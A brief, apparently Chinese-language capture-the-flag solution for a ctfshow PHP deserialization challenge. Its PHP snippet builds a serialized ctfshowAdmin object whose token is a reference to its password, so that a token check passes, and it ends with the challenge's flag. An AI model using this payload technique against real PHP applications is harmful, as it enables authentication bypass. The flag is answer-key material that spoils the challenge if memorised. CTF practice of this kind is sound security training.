使用引用
```
<?php
class ctfshowAdmin{
    public $token;
    public $password;
}
$a = new ctfshowAdmin();
$a->token = &$a->password;
echo urlencode(serialize($a));
?>
```
flag : ctfshow{a4ad29b0-b250-414b-8e18-d5cbe006f69c}